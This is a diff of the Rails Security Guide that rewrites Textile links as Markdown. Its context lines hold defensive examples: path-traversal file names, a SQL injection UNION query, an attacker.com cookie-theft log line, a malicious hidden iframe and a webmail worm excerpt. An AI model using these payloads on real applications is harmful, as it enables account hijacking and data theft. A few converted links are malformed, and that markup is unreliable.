@@ -71,7 +71,7 @@ config.force_ssl = true
 
 * Instead of stealing a cookie unknown to the attacker, he fixes a user's session identifier (in the cookie) known to him. Read more about this so-called session fixation later.
 
-The main objective of most attackers is to make money. The underground prices for stolen bank login accounts range from $10–$1000 (depending on the available amount of funds), $0.40–$20 for credit card numbers, $1–$8 for online auction site accounts and $4–$30 for email passwords, according to the "Symantec Global Internet Security Threat Report":http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf.
+The main objective of most attackers is to make money. The underground prices for stolen bank login accounts range from $10–$1000 (depending on the available amount of funds), $0.40–$20 for credit card numbers, $1–$8 for online auction site accounts and $4–$30 for email passwords, according to the [Symantec Global Internet Security Threat Report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf).
 
 ### Session Guidelines
 
@@ -290,7 +290,7 @@ NOTE: _Make sure file uploads don't overwrite important files, and process media
 
 Many web applications allow users to upload files. _(highlight)File names, which the user may choose (partly), should always be filtered_ as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like “../../../etc/passwd”, it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so – one more reason to run web servers, database servers and other programs as a less privileged Unix user.
 
-When filtering user input file names, _(highlight)don't try to remove malicious parts_. Think of a situation where the web application removes all “../” in a file name and an attacker uses a string such as “....//” - the result will be “../”. It is best to use a whitelist approach, which _(highlight)checks for the validity of a file name with a set of accepted characters_. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the "attachment_fu plugin":https://github.com/technoweenie/attachment_fu/tree/master:
+When filtering user input file names, _(highlight)don't try to remove malicious parts_. Think of a situation where the web application removes all “../” in a file name and an attacker uses a string such as “....//” - the result will be “../”. It is best to use a whitelist approach, which _(highlight)checks for the validity of a file name with a set of accepted characters_. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the [attachment_fu plugin](https://github.com/technoweenie/attachment_fu/tree/master:)
 
 ```ruby
 def sanitize_filename(filename)
@@ -354,7 +354,7 @@ Refer to the Injection section for countermeasures against XSS. It is _(highligh
 
 *CSRF*  Cross-Site Reference Forgery (CSRF) is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.
 
-A real-world example is a "router reconfiguration by CSRF":http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352. The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. Everyone who accessed the banking site through that router saw the attacker's fake web site and had his credentials stolen.
+A real-world example is a [router reconfiguration by CSRF](http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352). The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for them, but it also contained an image tag that resulted in a HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. Everyone who accessed the banking site through that router saw the attacker's fake web site and had his credentials stolen.
 
 Another example changed Google Adsense's e-mail address and password by. If the victim was logged into Google Adsense, the administration interface for Google advertisements campaigns, an attacker could change his credentials. 
 
@@ -490,7 +490,7 @@ User Management
 
 NOTE: _Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure._
 
-There are a number of authentication plug-ins for Rails available. Good ones, such as the popular "devise":https://github.com/plataformatec/devise and "authlogic":https://github.com/binarylogic/authlogic, store only encrypted passwords, not plain-text passwords. In Rails 3.1 you can use the built-in `has_secure_password` method which has similar features.
+There are a number of authentication plug-ins for Rails available. Good ones, such as the popular [devise](https://github.com/plataformatec/devise) and [authlogic](https://github.com/binarylogic/authlogic), store only encrypted passwords, not plain-text passwords. In Rails 3.1 you can use the built-in `has_secure_password` method which has similar features.
 
 Every new user gets an activation code to activate his account when he gets an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested an URL like these, he would be logged in as the first activated user found in the database (and chances are that this is the administrator):
 
@@ -511,7 +511,7 @@ If the parameter was nil, the resulting SQL query will be
 SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
 ```
 
-And thus it found the first user in the database, returned it and logged him in. You can find out more about it in "my blog post":http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/. _(highlight)It is advisable to update your plug-ins from time to time_. Moreover, you can review your application to find more flaws like this.
+And thus it found the first user in the database, returned it and logged him in. You can find out more about it in [my blog post](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/). _(highlight)It is advisable to update your plug-ins from time to time_. Moreover, you can review your application to find more flaws like this.
 
 ### Brute-Forcing Accounts
 
@@ -539,13 +539,13 @@ However, the attacker may also take over the account by changing the e-mail addr
 
 #### Other
 
-Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in "Google Mail":http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/. In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, _(highlight)review your application logic and eliminate all XSS and CSRF vulnerabilities_.
+Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, _(highlight)review your application logic and eliminate all XSS and CSRF vulnerabilities_.
 
 ### CAPTCHAs
 
 INFO: _A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect comment forms from automatic spam bots by asking the user to type the letters of a distorted image. The idea of a negative CAPTCHA is not for a user to prove that he is human, but reveal that a robot is a robot._
 
-But not only spam robots (bots) are a problem, but also automatic login bots. A popular CAPTCHA API is "reCAPTCHA":http://recaptcha.net/ which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. "ReCAPTCHA":http://ambethia.com/recaptcha/ is also a Rails plug-in with the same name as the API.
+But not only spam robots (bots) are a problem, but also automatic login bots. A popular CAPTCHA API is [reCAPTCHA](http://recaptcha.net/) which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. [ReCAPTCHA](http://ambethia.com/recaptcha/) is also a Rails plug-in with the same name as the API.
 
 You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
 The problem with CAPTCHAs is, they are annoying. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. The idea of negative CAPTCHAs is not to ask a user to proof that he is human, but reveal that a spam robot is a bot.
@@ -560,7 +560,7 @@ Here are some ideas how to hide honeypot fields by JavaScript and/or CSS:
 
 The most simple negative CAPTCHA is one hidden honeypot field. On the server side, you will check the value of the field: If it contains any text, it must be a bot. Then, you can either ignore the post or return a positive result, but not saving the post to the database. This way the bot will be satisfied and moves on. You can do this with annoying users, too.
 
-You can find more sophisticated negative CAPTCHAs in Ned Batchelder's "blog post":http://nedbatchelder.com/text/stopbots.html:
+You can find more sophisticated negative CAPTCHAs in Ned Batchelder's [blog post](http://nedbatchelder.com/text/stopbots.html:)
 
 * Include a field with the current UTC time-stamp in it and check it on the server. If it is too far in the past, or if it is in the future, the form is invalid.
 * Randomize the field names
@@ -582,7 +582,7 @@ config.filter_parameters << :password
 
 INFO: _Do you find it hard to remember all your passwords? Don't write them down, but use the initial letters of each word in an easy to remember sentence._
 
-Bruce Schneier, a security technologist, "has analyzed":http://www.schneier.com/blog/archives/2006/12/realworld_passw.html 34,000 real-world user names and passwords from the MySpace phishing attack mentioned <a href="#examples-from-the-underground">below</a>. It turns out that most of the passwords are quite easy to crack. The 20 most common passwords are:
+Bruce Schneier, a security technologist, [has analyzed](http://www.schneier.com/blog/archives/2006/12/realworld_passw.html) 34,000 real-world user names and passwords from the MySpace phishing attack mentioned <a href="#examples-from-the-underground">below</a>. It turns out that most of the passwords are quite easy to crack. The 20 most common passwords are:
 
 password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, and monkey.
 
@@ -732,7 +732,7 @@ SELECT * FROM projects WHERE (name = '') UNION
 
 The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.
 
-Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails "to at least 2.1.1":http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/.
+Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails [to at least 2.1.1](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/).
 
 #### Countermeasures
 
@@ -760,13 +760,13 @@ INFO: _The most widespread, and one of the most devastating security vulnerabili
 
 An entry point is a vulnerable URL and its parameters where an attacker can start an attack.
 
-The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter – obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the "Live HTTP Headers Firefox plugin":http://livehttpheaders.mozdev.org/, or client-site proxies make it easy to change requests.
+The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter – obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the [Live HTTP Headers Firefox plugin](http://livehttpheaders.mozdev.org/), or client-site proxies make it easy to change requests.
 
 XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.
 
-During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The "Symantec Global Internet Security threat report":http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf also documented 239 browser plug-in vulnerabilities in the last six months of 2007. "Mpack":http://pandalabs.pandasecurity.com/mpack-uncovered/ is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high targets.
+During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The [Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) also documented 239 browser plug-in vulnerabilities in the last six months of 2007. [Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/) is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high targets.
 
-A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to "Trend Micro":http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/.
+A relatively new, and unusual, form of entry points are banner advertisements. In earlier 2008, malicious code appeared in banner ads on popular sites, such as MySpace and Excite, according to [Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/).
 
 #### HTML/JavaScript Injection
 
@@ -805,7 +805,7 @@ The log files on www.attacker.com will read like this:
 GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
 ```
 
-You can mitigate these attacks (in the obvious way) by adding the "httpOnly":http://dev.rubyonrails.org/ticket/8895 flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies "will still be visible using Ajax":http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/, though.
+You can mitigate these attacks (in the obvious way) by adding the [httpOnly](http://dev.rubyonrails.org/ticket/8895) flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies [will still be visible using Ajax](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/), though.
 
 ##### Defacement
 
@@ -815,7 +815,7 @@ With web page defacement an attacker can do a lot of things, for example, presen
 <iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”></iframe>
 ```
 
-This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the "Mpack attack framework":http://isc.sans.org/diary.html?storyid=3015. Mpack tries to install malicious software through security holes in the web browser – very successfully, 50% of the attacks succeed.
+This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the [Mpack attack framework](http://isc.sans.org/diary.html?storyid=3015). Mpack tries to install malicious software through security holes in the web browser – very successfully, 50% of the attacks succeed.
 
 A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.
 
@@ -847,7 +847,7 @@ s = sanitize(user_input, :tags => tags, :attributes => %w(href title))
 
 This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.
 
-As a second step, _(highlight)it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _(highlight)Use `escapeHTML()` (or its alias `h()`) method_ to replace the HTML input characters &amp;, &quot;, &lt;, &gt; by their uninterpreted representations in HTML (`&amp;amp;`, `&amp;quot;`, `&amp;lt`;, and `&amp;gt;`). However, it can easily happen that the programmer forgets to use it, so <em class="highlight">it is recommended to use the "SafeErb":http://safe-erb.rubyforge.org/svn/plugins/safe_erb/ plugin</em>. SafeErb reminds you to escape strings from external sources.
+As a second step, _(highlight)it is good practice to escape all output of the application_, especially when re-displaying user input, which hasn't been input-filtered (as in the search form example earlier on). _(highlight)Use `escapeHTML()` (or its alias `h()`) method_ to replace the HTML input characters &amp;, &quot;, &lt;, &gt; by their uninterpreted representations in HTML (`&amp;amp;`, `&amp;quot;`, `&amp;lt`;, and `&amp;gt;`). However, it can easily happen that the programmer forgets to use it, so <em class=[highlight">it is recommended to use the "SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/) plugin</em>. SafeErb reminds you to escape strings from external sources.
 
 ##### Obfuscation and Encoding Injection
 
@@ -858,13 +858,13 @@ Network traffic is mostly based on the limited Western alphabet, so new characte
   &amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;>
 ```
 
-This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus “get to know your enemy”, is the "Hackvertor":https://hackvertor.co.uk/public. Rails' sanitize() method does a good job to fend off encoding attacks.
+This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus “get to know your enemy”, is the [Hackvertor](https://hackvertor.co.uk/public). Rails' sanitize() method does a good job to fend off encoding attacks.
 
 #### Examples from the Underground
 
 _In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._
 
-The following is an excerpt from the "Js.Yamanner@m":http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1 Yahoo! Mail "worm":http://groovin.net/stuff/yammer.txt. It appeared on June 11, 2006 and was the first webmail interface worm:
+The following is an excerpt from the [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [worm](http://groovin.net/stuff/yammer.txt). It appeared on June 11, 2006 and was the first webmail interface worm:
 
 ```html
 <img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
@@ -874,9 +874,9 @@ The following is an excerpt from the "Js.Yamanner@m":http://www.symantec.com/sec
 
 The worms exploits a hole in Yahoo's HTML/JavaScript filter, which usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.
 
-Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on "Rosario Valotta's paper":http://www.xssed.com/article/9/Paper_A_PoC_of_a_cross_webmail_worm_XWW_called_Njuda_connection/. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.
+Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on [Rosario Valotta's paper](http://www.xssed.com/article/9/Paper_A_PoC_of_a_cross_webmail_worm_XWW_called_Njuda_connection/). Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.
 
-In December 2006, 34,000 actual user names and passwords were stolen in a "MySpace phishing attack":http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html. The idea of the attack was to create a profile page named “login_home_index_html”, so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.
+In December 2006, 34,000 actual user names and passwords were stolen in a [MySpace phishing attack](http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html). The idea of the attack was to create a profile page named “login_home_index_html”, so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.
 
 The MySpace Samy worm will be discussed in the CSS Injection section.
 
@@ -884,7 +884,7 @@ The MySpace Samy worm will be discussed in the CSS Injection section.
 
 INFO: _CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application._
 
-CSS Injection is explained best by a well-known worm, the "MySpace Samy worm":http://namb.la/popular/tech.html. This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.
+CSS Injection is explained best by a well-known worm, the [MySpace Samy worm](http://namb.la/popular/tech.html). This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.
 
 MySpace blocks many tags, however it allows CSS. So the worm's author put JavaScript into CSS like this:
 
@@ -914,7 +914,7 @@ Another problem for the worm's author were CSRF security tokens. Without them he
 
 In the end, he got a 4 KB worm, which he injected into his profile page.
 
-The "moz-binding":http://www.securiteam.com/securitynews/5LP051FHPE.html CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).
+The [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).
 
 #### Countermeasures
 
@@ -922,9 +922,9 @@ This example, again, showed that a blacklist filter is never complete. However, 
 
 ### Textile Injection
 
-If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. "RedCloth":http://redcloth.org/ is such a language for Ruby, but without precautions, it is also vulnerable to XSS.
+If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. [RedCloth](http://redcloth.org/) is such a language for Ruby, but without precautions, it is also vulnerable to XSS.
 
-For example, RedCloth translates `_test_` to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the "all-new version 4":http://www.redcloth.org that removed serious bugs. However, even that version has "some security bugs":http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html, so the countermeasures still apply. Here is an example for version 3.0.4:
+For example, RedCloth translates `_test_` to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the [all-new version 4](http://www.redcloth.org) that removed serious bugs. However, even that version has [some security bugs](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), so the countermeasures still apply. Here is an example for version 3.0.4:
 
 ```ruby
 RedCloth.new('<script>alert(1)</script>').to_html
@@ -953,7 +953,7 @@ It is recommended to _(highlight)use RedCloth in combination with a whitelist in
 
 NOTE: _The same security precautions have to be taken for Ajax actions as for “normal” ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._
 
-If you use the "in_place_editor plugin":http://dev.rubyonrails.org/browser/plugins/in_place_editing, or actions that return a string, rather than rendering a view, _(highlight)you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.
+If you use the [in_place_editor plugin](http://dev.rubyonrails.org/browser/plugins/in_place_editing), or actions that return a string, rather than rendering a view, _(highlight)you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.
 
 ### Command Line Injection
 
@@ -1064,18 +1064,18 @@ _'1; mode=block' in Rails by default_ - use XSS Auditor and block page if XSS at
 * X-Content-Type-Options
 _'nosniff' in Rails by default_ - stops the browser from guessing the MIME type of a file.
 * X-Content-Security-Policy
-"A powerful mechanism for controlling which sites certain content types can be loaded from":http://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html
+[A powerful mechanism for controlling which sites certain content types can be loaded from](http://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html)
 * Access-Control-Allow-Origin
 Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.
 * Strict-Transport-Security
-"Used to control if the browser is allowed to only access a site over a secure connection":http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security
+[Used to control if the browser is allowed to only access a site over a secure connection](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)
 
 Additional Resources
 --------------------
 
 The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:
 
-* The Ruby on Rails security project posts security news regularly: "http://www.rorsecurity.info":http://www.rorsecurity.info
-* Subscribe to the Rails security "mailing list":http://groups.google.com/group/rubyonrails-security
-* "Keep up to date on the other application layers":http://secunia.com/ (they have a weekly newsletter, too)
-* A "good security blog":http://ha.ckers.org/blog/ including the "Cross-Site scripting Cheat Sheet":http://ha.ckers.org/xss.html
+* The Ruby on Rails security project posts security news regularly: [http://www.rorsecurity.info](http://www.rorsecurity.info)
+* Subscribe to the Rails security [mailing list](http://groups.google.com/group/rubyonrails-security)
+* [Keep up to date on the other application layers](http://secunia.com/) (they have a weekly newsletter, too)
+* A [good security blog](http://ha.ckers.org/blog/) including the [Cross-Site scripting Cheat Sheet](http://ha.ckers.org/xss.html)
